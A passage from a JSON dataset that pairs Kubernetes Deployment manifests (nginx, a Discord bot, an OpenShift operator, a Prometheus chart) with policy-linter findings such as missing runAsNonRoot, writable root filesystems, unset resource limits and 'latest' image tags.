    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8583",
    "manifest_path": "data/manifests/the_stack_sample/sample_3208.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-eventstore\n  labels:\n    project: entropy\n    lab: event-journal-playground\nspec:\n  selector:\n    matchLabels:\n      app: frontend-eventstore\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: frontend-eventstore\n        track: stable\n        project: entropy\n        lab: event-journal-playground\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15\n        volumeMounts:\n        - name: nginx-eventstore-frontend-conf\n          mountPath: /etc/nginx/conf.d\n      volumes:\n      - name: nginx-eventstore-frontend-conf\n        configMap:\n          name: nginx-eventstore-frontend-conf\n          items:\n          - key: nginx-configmap.conf\n            path: nginx-configmap.conf\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8584",
    "manifest_path": "data/manifests/the_stack_sample/sample_3208.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend-eventstore\n  labels:\n    project: entropy\n    lab: event-journal-playground\nspec:\n  selector:\n    matchLabels:\n      app: frontend-eventstore\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: frontend-eventstore\n        track: stable\n        project: entropy\n        lab: event-journal-playground\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15\n        volumeMounts:\n        - name: nginx-eventstore-frontend-conf\n          mountPath: /etc/nginx/conf.d\n      volumes:\n      - name: nginx-eventstore-frontend-conf\n        configMap:\n          name: nginx-eventstore-frontend-conf\n          items:\n          - key: nginx-configmap.conf\n            path: nginx-configmap.conf\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8585",
    "manifest_path": "data/manifests/the_stack_sample/sample_3209.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rollem-prod-68-deployment\nspec:\n  selector:\n    matchLabels:\n      app: rollem-prod\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rollem-prod\n    spec:\n      containers:\n      - name: rollem-shard-68\n        image: lemtzas/rollem-discord:2.7.4\n        resources:\n          requests:\n            cpu: 50m\n            memory: 250M\n        env:\n        - name: reboot\n          value: '2022-03-24'\n        - name: DISCORD_BOT_SHARD_ID\n          value: '68'\n        - name: DISCORD_BOT_SHARD_COUNT\n          value: '80'\n        - name: DISCORD_BOT_USER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DISCORD_BOT_USER_TOKEN\n        - name: APPINSIGHTS_CONNECTIONSTRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: APPINSIGHTS_CONNECTIONSTRING\n        - name: DEFER_TO_CLIENT_IDS\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DEFER_TO_CLIENT_IDS\n        - name: DB_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DB_CONNECTION_STRING\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rollem-shard-68\" does not have a read-only root file system"
  },
  {
    "id": "8586",
    "manifest_path": "data/manifests/the_stack_sample/sample_3209.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rollem-prod-68-deployment\nspec:\n  selector:\n    matchLabels:\n      app: rollem-prod\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rollem-prod\n    spec:\n      containers:\n      - name: rollem-shard-68\n        image: lemtzas/rollem-discord:2.7.4\n        resources:\n          requests:\n            cpu: 50m\n            memory: 250M\n        env:\n        - name: reboot\n          value: '2022-03-24'\n        - name: DISCORD_BOT_SHARD_ID\n          value: '68'\n        - name: DISCORD_BOT_SHARD_COUNT\n          value: '80'\n        - name: DISCORD_BOT_USER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DISCORD_BOT_USER_TOKEN\n        - name: APPINSIGHTS_CONNECTIONSTRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: APPINSIGHTS_CONNECTIONSTRING\n        - name: DEFER_TO_CLIENT_IDS\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DEFER_TO_CLIENT_IDS\n        - name: DB_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DB_CONNECTION_STRING\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rollem-shard-68\" is not set to runAsNonRoot"
  },
  {
    "id": "8587",
    "manifest_path": "data/manifests/the_stack_sample/sample_3209.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rollem-prod-68-deployment\nspec:\n  selector:\n    matchLabels:\n      app: rollem-prod\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rollem-prod\n    spec:\n      containers:\n      - name: rollem-shard-68\n        image: lemtzas/rollem-discord:2.7.4\n        resources:\n          requests:\n            cpu: 50m\n            memory: 250M\n        env:\n        - name: reboot\n          value: '2022-03-24'\n        - name: DISCORD_BOT_SHARD_ID\n          value: '68'\n        - name: DISCORD_BOT_SHARD_COUNT\n          value: '80'\n        - name: DISCORD_BOT_USER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DISCORD_BOT_USER_TOKEN\n        - name: APPINSIGHTS_CONNECTIONSTRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: APPINSIGHTS_CONNECTIONSTRING\n        - name: DEFER_TO_CLIENT_IDS\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DEFER_TO_CLIENT_IDS\n        - name: DB_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DB_CONNECTION_STRING\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rollem-shard-68\" has memory limit 0"
  },
  {
    "id": "8588",
    "manifest_path": "data/manifests/the_stack_sample/sample_3212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-cluster-storage-operator\n  name: csi-snapshot-controller-operator\n  labels:\n    app: csi-snapshot-controller-operator\n  annotations:\n    config.openshift.io/inject-proxy: csi-snapshot-controller-operator\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\n    include.release.openshift.io/ibm-cloud-managed: 'true'\n    include.release.openshift.io/self-managed-high-availability: 'true'\n    include.release.openshift.io/single-node-developer: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: csi-snapshot-controller-operator\n  template:\n    metadata:\n      name: csi-snapshot-controller-operator\n      labels:\n        app: csi-snapshot-controller-operator\n    spec:\n      serviceAccountName: csi-snapshot-controller-operator\n      containers:\n      - name: csi-snapshot-controller-operator\n        image: quay.io/openshift/origin-cluster-csi-snapshot-controller-operator:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 65Mi\n            cpu: 10m\n        args:\n        - start\n        - -v\n        - '5'\n        - --config=/var/run/configmaps/config/operator-config.yaml\n        env:\n        - name: OPERAND_IMAGE\n          value: quay.io/openshift/origin-csi-snapshot-controller\n        - name: WEBHOOK_IMAGE\n          value: registry.svc.ci.openshift.org/ocp/4.7:csi-snapshot-validation-webhook\n        - name: OPERATOR_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERAND_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n      volumes:\n      - name: config\n        configMap:\n          defaultMode: 440\n          name: csi-snapshot-controller-operator-config\n      securityContext:\n        fsGroup: 10400\n        runAsGroup: 10400\n        runAsUser: 10400\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-snapshot-controller-operator\" is using an invalid container image, \"quay.io/openshift/origin-cluster-csi-snapshot-controller-operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8589",
    "manifest_path": "data/manifests/the_stack_sample/sample_3212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-cluster-storage-operator\n  name: csi-snapshot-controller-operator\n  labels:\n    app: csi-snapshot-controller-operator\n  annotations:\n    config.openshift.io/inject-proxy: csi-snapshot-controller-operator\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\n    include.release.openshift.io/ibm-cloud-managed: 'true'\n    include.release.openshift.io/self-managed-high-availability: 'true'\n    include.release.openshift.io/single-node-developer: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: csi-snapshot-controller-operator\n  template:\n    metadata:\n      name: csi-snapshot-controller-operator\n      labels:\n        app: csi-snapshot-controller-operator\n    spec:\n      serviceAccountName: csi-snapshot-controller-operator\n      containers:\n      - name: csi-snapshot-controller-operator\n        image: quay.io/openshift/origin-cluster-csi-snapshot-controller-operator:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 65Mi\n            cpu: 10m\n        args:\n        - start\n        - -v\n        - '5'\n        - --config=/var/run/configmaps/config/operator-config.yaml\n        env:\n        - name: OPERAND_IMAGE\n          value: quay.io/openshift/origin-csi-snapshot-controller\n        - name: WEBHOOK_IMAGE\n          value: registry.svc.ci.openshift.org/ocp/4.7:csi-snapshot-validation-webhook\n        - name: OPERATOR_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERAND_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n      volumes:\n      - name: config\n        configMap:\n          defaultMode: 440\n          name: csi-snapshot-controller-operator-config\n      securityContext:\n        fsGroup: 10400\n        runAsGroup: 10400\n        runAsUser: 10400\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-snapshot-controller-operator\" does not have a read-only root file system"
  },
  {
    "id": "8590",
    "manifest_path": "data/manifests/the_stack_sample/sample_3212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-cluster-storage-operator\n  name: csi-snapshot-controller-operator\n  labels:\n    app: csi-snapshot-controller-operator\n  annotations:\n    config.openshift.io/inject-proxy: csi-snapshot-controller-operator\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\n    include.release.openshift.io/ibm-cloud-managed: 'true'\n    include.release.openshift.io/self-managed-high-availability: 'true'\n    include.release.openshift.io/single-node-developer: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: csi-snapshot-controller-operator\n  template:\n    metadata:\n      name: csi-snapshot-controller-operator\n      labels:\n        app: csi-snapshot-controller-operator\n    spec:\n      serviceAccountName: csi-snapshot-controller-operator\n      containers:\n      - name: csi-snapshot-controller-operator\n        image: quay.io/openshift/origin-cluster-csi-snapshot-controller-operator:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 65Mi\n            cpu: 10m\n        args:\n        - start\n        - -v\n        - '5'\n        - --config=/var/run/configmaps/config/operator-config.yaml\n        env:\n        - name: OPERAND_IMAGE\n          value: quay.io/openshift/origin-csi-snapshot-controller\n        - name: WEBHOOK_IMAGE\n          value: registry.svc.ci.openshift.org/ocp/4.7:csi-snapshot-validation-webhook\n        - name: OPERATOR_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERAND_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n      volumes:\n      - name: config\n        configMap:\n          defaultMode: 440\n          name: csi-snapshot-controller-operator-config\n      securityContext:\n        fsGroup: 10400\n        runAsGroup: 10400\n        runAsUser: 10400\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"csi-snapshot-controller-operator\" not found"
  },
  {
    "id": "8591",
    "manifest_path": "data/manifests/the_stack_sample/sample_3212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-cluster-storage-operator\n  name: csi-snapshot-controller-operator\n  labels:\n    app: csi-snapshot-controller-operator\n  annotations:\n    config.openshift.io/inject-proxy: csi-snapshot-controller-operator\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\n    include.release.openshift.io/ibm-cloud-managed: 'true'\n    include.release.openshift.io/self-managed-high-availability: 'true'\n    include.release.openshift.io/single-node-developer: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: csi-snapshot-controller-operator\n  template:\n    metadata:\n      name: csi-snapshot-controller-operator\n      labels:\n        app: csi-snapshot-controller-operator\n    spec:\n      serviceAccountName: csi-snapshot-controller-operator\n      containers:\n      - name: csi-snapshot-controller-operator\n        image: quay.io/openshift/origin-cluster-csi-snapshot-controller-operator:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 65Mi\n            cpu: 10m\n        args:\n        - start\n        - -v\n        - '5'\n        - --config=/var/run/configmaps/config/operator-config.yaml\n        env:\n        - name: OPERAND_IMAGE\n          value: quay.io/openshift/origin-csi-snapshot-controller\n        - name: WEBHOOK_IMAGE\n          value: registry.svc.ci.openshift.org/ocp/4.7:csi-snapshot-validation-webhook\n        - name: OPERATOR_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERAND_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n      volumes:\n      - name: config\n        configMap:\n          defaultMode: 440\n          name: csi-snapshot-controller-operator-config\n      securityContext:\n        fsGroup: 10400\n        runAsGroup: 10400\n        runAsUser: 10400\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-snapshot-controller-operator\" has memory limit 0"
  },
  {
    "id": "8592",
    "manifest_path": "data/manifests/the_stack_sample/sample_3214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: prometheus\n    chart: prometheus-15.1.1\n    component: server\n    heritage: Helm\n    release: RELEASE-NAME\n  name: RELEASE-NAME-prometheus-server\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n      component: server\n      release: RELEASE-NAME\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        chart: prometheus-15.1.1\n        component: server\n        heritage: Helm\n        release: RELEASE-NAME\n    spec:\n      containers:\n      - args:\n        - --volume-dir=/etc/config\n        - --webhook-url=http://127.0.0.1:9090/-/reload\n        image: jimmidyson/configmap-reload:v0.5.0\n        imagePullPolicy: IfNotPresent\n        name: prometheus-server-configmap-reload\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n          readOnly: true\n      - args:\n        - --storage.tsdb.retention.time=15d\n        - --config.file=/etc/config/prometheus.yml\n        - --storage.tsdb.path=/data\n        - --web.console.libraries=/etc/prometheus/console_libraries\n        - --web.console.templates=/etc/prometheus/consoles\n        - --web.enable-lifecycle\n        image: quay.io/prometheus/prometheus:v2.31.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/healthy\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: prometheus-server\n        ports:\n        - containerPort: 9090\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/ready\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 4\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        - mountPath: /data\n          name: storage-volume\n          subPath: ''\n      securityContext:\n        fsGroup: 65534\n        runAsGroup: 65534\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: RELEASE-NAME-prometheus-server\n      volumes:\n      - configMap:\n          name: RELEASE-NAME-prometheus-server\n        name: config-volume\n      - name: storage-volume\n        persistentVolumeClaim:\n          claimName: RELEASE-NAME-prometheus-server\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus-server\" does not have a read-only root file system"
  },
  {
    "id": "8593",
    "manifest_path": "data/manifests/the_stack_sample/sample_3214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: prometheus\n    chart: prometheus-15.1.1\n    component: server\n    heritage: Helm\n    release: RELEASE-NAME\n  name: RELEASE-NAME-prometheus-server\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n      component: server\n      release: RELEASE-NAME\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        chart: prometheus-15.1.1\n        component: server\n        heritage: Helm\n        release: RELEASE-NAME\n    spec:\n      containers:\n      - args:\n        - --volume-dir=/etc/config\n        - --webhook-url=http://127.0.0.1:9090/-/reload\n        image: jimmidyson/configmap-reload:v0.5.0\n        imagePullPolicy: IfNotPresent\n        name: prometheus-server-configmap-reload\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n          readOnly: true\n      - args:\n        - --storage.tsdb.retention.time=15d\n        - --config.file=/etc/config/prometheus.yml\n        - --storage.tsdb.path=/data\n        - --web.console.libraries=/etc/prometheus/console_libraries\n        - --web.console.templates=/etc/prometheus/consoles\n        - --web.enable-lifecycle\n        image: quay.io/prometheus/prometheus:v2.31.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/healthy\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: prometheus-server\n        ports:\n        - containerPort: 9090\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/ready\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 4\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        - mountPath: /data\n          name: storage-volume\n          subPath: ''\n      securityContext:\n        fsGroup: 65534\n        runAsGroup: 65534\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: RELEASE-NAME-prometheus-server\n      volumes:\n      - configMap:\n          name: RELEASE-NAME-prometheus-server\n        name: config-volume\n      - name: storage-volume\n        persistentVolumeClaim:\n          claimName: RELEASE-NAME-prometheus-server\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus-server-configmap-reload\" does not have a read-only root file system"
  },
  {
    "id": "8594",
    "manifest_path": "data/manifests/the_stack_sample/sample_3214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: prometheus\n    chart: prometheus-15.1.1\n    component: server\n    heritage: Helm\n    release: RELEASE-NAME\n  name: RELEASE-NAME-prometheus-server\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n      component: server\n      release: RELEASE-NAME\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        chart: prometheus-15.1.1\n        component: server\n        heritage: Helm\n        release: RELEASE-NAME\n    spec:\n      containers:\n      - args:\n        - --volume-dir=/etc/config\n        - --webhook-url=http://127.0.0.1:9090/-/reload\n        image: jimmidyson/configmap-reload:v0.5.0\n        imagePullPolicy: IfNotPresent\n        name: prometheus-server-configmap-reload\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n          readOnly: true\n      - args:\n        - --storage.tsdb.retention.time=15d\n        - --config.file=/etc/config/prometheus.yml\n        - --storage.tsdb.path=/data\n        - --web.console.libraries=/etc/prometheus/console_libraries\n        - --web.console.templates=/etc/prometheus/consoles\n        - --web.enable-lifecycle\n        image: quay.io/prometheus/prometheus:v2.31.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/healthy\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: prometheus-server\n        ports:\n        - containerPort: 9090\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/ready\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 4\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        - mountPath: /data\n          name: storage-volume\n          subPath: ''\n      securityContext:\n        fsGroup: 65534\n        runAsGroup: 65534\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: RELEASE-NAME-prometheus-server\n      volumes:\n      - configMap:\n          name: RELEASE-NAME-prometheus-server\n        name: config-volume\n      - name: storage-volume\n        persistentVolumeClaim:\n          claimName: RELEASE-NAME-prometheus-server\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"RELEASE-NAME-prometheus-server\" not found"
  },
  {
    "id": "8595",
    "manifest_path": "data/manifests/the_stack_sample/sample_3214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: prometheus\n    chart: prometheus-15.1.1\n    component: server\n    heritage: Helm\n    release: RELEASE-NAME\n  name: RELEASE-NAME-prometheus-server\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n      component: server\n      release: RELEASE-NAME\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        chart: prometheus-15.1.1\n        component: server\n        heritage: Helm\n        release: RELEASE-NAME\n    spec:\n      containers:\n      - args:\n        - --volume-dir=/etc/config\n        - --webhook-url=http://127.0.0.1:9090/-/reload\n        image: jimmidyson/configmap-reload:v0.5.0\n        imagePullPolicy: IfNotPresent\n        name: prometheus-server-configmap-reload\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n          readOnly: true\n      - args:\n        - --storage.tsdb.retention.time=15d\n        - --config.file=/etc/config/prometheus.yml\n        - --storage.tsdb.path=/data\n        - --web.console.libraries=/etc/prometheus/console_libraries\n        - --web.console.templates=/etc/prometheus/consoles\n        - --web.enable-lifecycle\n        image: quay.io/prometheus/prometheus:v2.31.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/healthy\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: prometheus-server\n        ports:\n        - containerPort: 9090\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/ready\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 4\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        - mountPath: /data\n          name: storage-volume\n          subPath: ''\n      securityContext:\n        fsGroup: 65534\n        runAsGroup: 65534\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: RELEASE-NAME-prometheus-server\n      volumes:\n      - configMap:\n          name: RELEASE-NAME-prometheus-server\n        name: config-volume\n      - name: storage-volume\n        persistentVolumeClaim:\n          claimName: RELEASE-NAME-prometheus-server\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prometheus-server\" has cpu request 0"
  },
  {
    "id": "8596",
    "manifest_path": "data/manifests/the_stack_sample/sample_3214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: prometheus\n    chart: prometheus-15.1.1\n    component: server\n    heritage: Helm\n    release: RELEASE-NAME\n  name: RELEASE-NAME-prometheus-server\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n      component: server\n      release: RELEASE-NAME\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        chart: prometheus-15.1.1\n        component: server\n        heritage: Helm\n        release: RELEASE-NAME\n    spec:\n      containers:\n      - args:\n        - --volume-dir=/etc/config\n        - --webhook-url=http://127.0.0.1:9090/-/reload\n        image: jimmidyson/configmap-reload:v0.5.0\n        imagePullPolicy: IfNotPresent\n        name: prometheus-server-configmap-reload\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n          readOnly: true\n      - args:\n        - --storage.tsdb.retention.time=15d\n        - --config.file=/etc/config/prometheus.yml\n        - --storage.tsdb.path=/data\n        - --web.console.libraries=/etc/prometheus/console_libraries\n        - --web.console.templates=/etc/prometheus/consoles\n        - --web.enable-lifecycle\n        image: quay.io/prometheus/prometheus:v2.31.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/healthy\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: prometheus-server\n        ports:\n        - containerPort: 9090\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/ready\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 4\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        - mountPath: /data\n          name: storage-volume\n          subPath: ''\n      securityContext:\n        fsGroup: 65534\n        runAsGroup: 65534\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: RELEASE-NAME-prometheus-server\n      volumes:\n      - configMap:\n          name: RELEASE-NAME-prometheus-server\n        name: config-volume\n      - name: storage-volume\n        persistentVolumeClaim:\n          claimName: RELEASE-NAME-prometheus-server\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prometheus-server-configmap-reload\" has cpu request 0"
  },
  {
    "id": "8597",
    "manifest_path": "data/manifests/the_stack_sample/sample_3214.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: prometheus\n    chart: prometheus-15.1.1\n    component: server\n    heritage: Helm\n    release: RELEASE-NAME\n  name: RELEASE-NAME-prometheus-server\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n      component: server\n      release: RELEASE-NAME\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        chart: prometheus-15.1.1\n        component: server\n        heritage: Helm\n        release: RELEASE-NAME\n    spec:\n      containers:\n      - args:\n        - --volume-dir=/etc/config\n        - --webhook-url=http://127.0.0.1:9090/-/reload\n        image: jimmidyson/configmap-reload:v0.5.0\n        imagePullPolicy: IfNotPresent\n        name: prometheus-server-configmap-reload\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n          readOnly: true\n      - args:\n        - --storage.tsdb.retention.time=15d\n        - --config.file=/etc/config/prometheus.yml\n        - --storage.tsdb.path=/data\n        - --web.console.libraries=/etc/prometheus/console_libraries\n        - --web.console.templates=/etc/prometheus/consoles\n        - --web.enable-lifecycle\n        image: quay.io/prometheus/prometheus:v2.31.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/healthy\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: prometheus-server\n        ports:\n        - containerPort: 9090\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/ready\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 4\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        - mountPath: /data\n          name: storage-volume\n          subPath: ''\n      securityContext:\n        fsGroup: 65534\n        runAsGroup: 65534\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: RELEASE-NAME-prometheus-server\n      volumes:\n      - configMap:\n          name: RELEASE-NAME-prometheus-server\n        name: config-volume\n      - name: storage-volume\n        persistentVolumeClaim:\n          claimName: RELEASE-NAME-prometheus-server\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus-server\" has memory limit 0"
  },
  {
    "id": "8598",
    "manifest_path": "data/manifests/the_stack_sample/sample_3214.yaml",
